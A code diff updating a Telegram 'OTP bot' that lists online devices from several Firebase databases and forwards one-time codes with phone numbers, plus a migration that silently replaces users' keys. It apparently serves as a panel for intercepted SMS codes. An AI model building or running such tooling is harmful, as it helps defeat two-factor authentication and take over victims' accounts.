@@ -2,8 +2,8 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║        ZONEX X OTP BOT v5.1              ║
-║  Premium UI Update                       ║
+║        ZONEX X OTP BOT v5.2              ║
+║  Premium UI Update & Key Migration       ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -95,14 +95,27 @@ def _default_data() -> dict:
         "maintenance": False,
     }
 
+def _migrate_keys(d: dict) -> dict:
+    """Purani non-ZONEX keys ko ZONEX format mein badlo."""
+    for uid, u in d.get("users", {}).items():
+        k = u.get("key", "")
+        if not k.startswith("ZONEX-"):
+            old = k
+            u["key"] = _gen_key_raw()
+            logger.info(f"🔑 Key migrated {uid}: {old} → {u['key']}")
+    return d
+
 def load_data() -> dict:
     try:
         if os.path.exists(DATA_FILE):
             with open(DATA_FILE) as f:
                 d = json.load(f)
             d.pop("activation_codes", None)
+            
+            # Run key migration
+            d = _migrate_keys(d)
+            
             for uid, u in d.get("users", {}).items():
-                u.setdefault("key",            _gen_key_raw())
                 u.setdefault("expires_at",     None)
                 u.setdefault("referred_by",    None)
                 u.setdefault("referral_count", 0)
@@ -156,8 +169,11 @@ async def _load_firestore() -> bool:
                 if not isinstance(d, dict):
                     return False
                 d.pop("activation_codes", None)
+                
+                # Run key migration
+                d = _migrate_keys(d)
+                
                 for uid, u in d.get("users", {}).items():
-                    u.setdefault("key",            _gen_key_raw())
                     u.setdefault("expires_at",     None)
                     u.setdefault("referred_by",    None)
                     u.setdefault("referral_count", 0)
@@ -709,17 +725,24 @@ def txt_device_card(label: str, dev_id: str) -> str:
     return "".join(lines)
 
 def txt_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
+    # Message ki length limit set karte hain
+    msg_text = e.get('msg', '')
+    if len(msg_text) > 200:
+        msg_text = msg_text[:200] + "..."
+        
     return (
         f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
         f"⚡ <b>𝐎𝐓𝐏 𝐀𝐋𝐄𝐑𝐓</b> ⚡\n"
         f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
-        f"🔢  <b><code>{e['otp']}</code></b>\n\n"
+        f"🔐 <b>𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 𝐂𝐎𝐃𝐄</b>\n\n"
+        f"⚡ <b><code>{e['otp']}</code></b> ⚡\n\n"
         f"╭──────────────────────╮\n"
-        f"📞 Number › <code>{info.get('phone','—')}</code>\n"
-        f"📤 Sender › {e['sender']}\n"
-        f"🕐 Time   › {e['time']}\n"
+        f"📞 𝐍𝐮𝐦𝐛𝐞𝐫 › <code>{info.get('phone','—')}</code>\n"
+        f"📤 𝐒𝐞𝐧𝐝𝐞𝐫 › {e['sender']}\n"
+        f"🕐 𝐓𝐢𝐦𝐞   › {e['time']}\n"
         f"╰──────────────────────╯\n\n"
-        f"💬 <i>{e['msg'][:200]}{'…' if len(e['msg'])>200 else ''}</i>\n\n"
+        f"💬 <b>𝐌𝐄𝐒𝐒𝐀𝐆𝐄</b>\n"
+        f"<i>{msg_text}</i>\n\n"
         f"🤖 <b>ZONEX X OTP Bot</b> · {BOT_DEV}"
     )
 
@@ -1290,13 +1313,21 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     elif cb.startswith("online:"):
         pg = int(cb.split(":")[1])
+        
+        # ── SCREENSHOT WALA PREMIUM SYNCING MESSAGE ──
+        sync_msg = (
+            "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+            " 🔄 <b>𝐒𝐘𝐍𝐂𝐈𝐍𝐆 𝐀𝐋𝐋 𝐍𝐔𝐌𝐁𝐄𝐑𝐒...</b>\n"
+            "╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+            "⏳ Please wait while we sync all\n"
+            "numbers.\n"
+            "⚡ <b>𝐏𝐑𝐎𝐂𝐄𝐒𝐒𝐈𝐍𝐆...</b>"
+        )
         try:
-            await q.edit_message_text(
-                "🔄 <b>Syncing all Firebase DBs…</b>\n\n"
-                "<i>Ek second — sab ka data akatha ho raha hai.</i>",
-                parse_mode="HTML")
+            await q.edit_message_text(sync_msg, parse_mode="HTML")
         except Exception:
             pass
+            
         async def _safe_clients(cfg):
             try:
                 await refresh_clients_only(cfg)
@@ -1308,17 +1339,36 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
         devs = all_online()
         total_online_all = count_online()
+        total_devices_all = count_total()
+
+        # ── Premium ONLINE DEVICES header ──
         if not devs:
+            txt = (
+                f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+                f"   📱 <b>𝐎𝐍𝐋𝐈𝐍𝐄 𝐃𝐄𝐕𝐈𝐂𝐄𝐒</b>\n"
+                f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+                f"🔴 <b>𝐍𝐎 𝐃𝐄𝐕𝐈𝐂𝐄 𝐎𝐍𝐋𝐈𝐍𝐄</b>\n\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"📱 𝐓𝐎𝐓𝐀𝐋 › <code>{total_devices_all}</code> devices\n"
+                f"🕐 𝐒𝐘𝐍𝐂 › <code>{last_refresh}</code>"
+            )
             await q.edit_message_text(
-                f"🔴 <b>Koi device online nahi</b>\n\n"
-                f"<i>Total online (all DBs): {total_online_all}\n"
-                f"Sync: {last_refresh}</i>",
-                reply_markup=kb_back(), parse_mode="HTML"); return
+                txt, reply_markup=kb_back(), parse_mode="HTML")
+            return
+
+        txt = (
+            f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+            f"   📱 <b>𝐎𝐍𝐋𝐈𝐍𝐄 𝐃𝐄𝐕𝐈𝐂𝐄𝐒</b>\n"
+            f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+            f"🟢 <b>𝐀𝐂𝐓𝐈𝐕𝐄</b> › <b>{total_online_all} 𝐃𝐄𝐕𝐈𝐂𝐄𝐒</b>\n"
+            f"🕐 <b>𝐒𝐘𝐍𝐂</b> › <code>{last_refresh}</code>\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"👇 <i>Neeche se device choose karo</i>"
+        )
         await q.edit_message_text(
-            f"📱 <b>Online Devices</b>  ·  <code>{len(devs)}</code> listed\n"
-            f"🟢 <i>Total online (all): {total_online_all}</i>\n"
-            f"<i>🕐 Sync: {last_refresh}</i>",
-            reply_markup=kb_online(devs, pg), parse_mode="HTML")
+            txt,
+            reply_markup=kb_online(devs, pg),
+            parse_mode="HTML")
 
     elif cb.startswith("dev:"):
         parts = cb.split(":", 3)
@@ -2572,7 +2622,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot v5.1 starting...")
+    logger.info("🚀 ZONEX X OTP Bot v5.2 starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
